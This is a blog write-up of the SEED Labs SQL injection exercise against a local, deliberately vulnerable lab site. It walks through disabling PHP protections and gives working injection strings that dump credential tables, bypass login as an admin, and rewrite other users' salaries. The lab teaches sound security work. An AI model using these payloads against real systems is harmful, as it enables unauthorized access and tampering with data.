---
title: "SEED Lab: SQL Injection"
date: 2025-02-28 10:00:00 +0000
categories: [WriteUps, SeedLab]
tags: [sql injection, seedlab]
author: "JT"
pin: false
toc: true
comments: true
---
Welcome to my write up on the SQL Injection lab from Seeds Security.
Although the official seedslab page says that it is possible fighting with 16.04. After fighting with ubuntu 16.04 I eventually went back to 12.04 because it already had php5 installed, and it is not worth the struggle of trying to down grade from php7 to php5 as the countermeasures we need to disable are not available in php7.

## Environment Setup
### Setting up the Webserver
Download the patch archive and untar it

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228142650.png)

Run the `bootstrap.sh` file to finish setup

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228142728.png)

### Disable the Countermeasures
Give `/etc/php5/apache2/php.ini` file permissions so we can write to it

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228143057.png)

Turn off the `magic_quotes_gpc` using vim

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228143208.png)


![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228142832.png)


![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228143143.png)

Restart the webserver

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228143240.png)

We should be ready to start
```
tar -zxvf patch.tar.gz
cd patch
./bootstrap.sh

cd /etc/php5/apache2
sudo chmod 777 php.ini
ls -la
vim php.ini
sudo service apache2 restart
```
## Task 1
### 1A
Let's start by logging in and seeing what we have available to us

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228144148.png)


![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228143316.png)

Select the Users database

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228143805.png)

View the tables

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228143811.png)

```
# Log into MySQL
mysql -u root -pseedubuntu
# Once in MySQL
use Users;
showtables
```
### 1B
Let's inject some SQL to get all values form the credentials table.

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228144140.png)

Using a always true statement like `1=1` will return everything, thereby essentially skipping the `where` parameter. This will return everything in the table to us. Make sure to close off the query and comment out anything after our injected SQL, using `;--`

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228144037.png)

```sql
SELECT * FROM credential WHERE eid = '' or 1=1;--
```
### 1C
Now we do not know the EID but we do know the name. 

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228144207.png)

We can do this by adding a simple `or` parameter which allows us to query by EID or name. The EID value does not matter considering that we are looking to query by name.

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228144405.png)

```sql
SELECT * FROM credential WHERE eid = '1' or Name = 'Admin';--
```
## Task 2

Navigate to http://seedlabsqlinjection.com. This gives us a login interface that we will perform SQL injection on.

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228144607.png)

We also are given the code used for authentication. Based on the select statement, there we should be able to do basic SQL injection and comment out the password checking.

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228145140.png)

### 2A

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228145329.png)

In this part we know the EID of the Admin so let's login with that and comment out the password check.  
```
99999';#
```

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228145003.png)

We have successfully logged in as admin and we can see everybody's profile

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228145012.png)

It worked that is Part 1 done.

### 2B

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228145336.png)

For part 2 we do not know the EID but we do know the `Name` of the Admin user. Knowing this we can give a random value for `EID`  and `or` it with the `Name` to get the Admin. Then comment out the rest of the logic like we have been doing.
```
1' or Name = 'Admin';#
```

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228145059.png)

Again, we have successfully logged in as Admin

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228145109.png)

This worked that is Part 2 done.
## Task 3
Start by logging into Alice' using the credentials `10000:seedalice`

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228145725.png)

Here is Alice's profile make note of her Salary, we will change it soon using our SQL injection strategies.

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228150759.png)

### 3A
Navigate to the "Edit Profile" page

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228145755.png)

Again let's take a look at the backend logic used to edit the profile page

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228150223.png)

```
',Salary='5000
```

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228151127.png)

**Note:** If you did something like `', Salary='5000';#` It would change everybody's salary as you skipping the where statement and applying it to all fields.

That worked like we can see that Alice's profile has changed from 20000 to 5000

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228150836.png)


### 3B
Now we want to change the Salary of our of boss to make it one dollar 

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228154817.png)

We can add a new `WHERE` parameter to our query so that we can query by name. This will allow us to update the salary for a specific user in the database. 
```
',Salary='1' WHERE Name = 'Boby';#
```

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228151430.png)

Now let's go back and log back in as admin too see if it worked.
```
99999';#
```

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228151359.png)

Perfect Boby now has a salary of 1

![Alt Text](/assets/images/SeedsSQLImgs/Pasted image 20250228151448.png)

## Conclusion
All required sections have been completed and this concludes the lab.
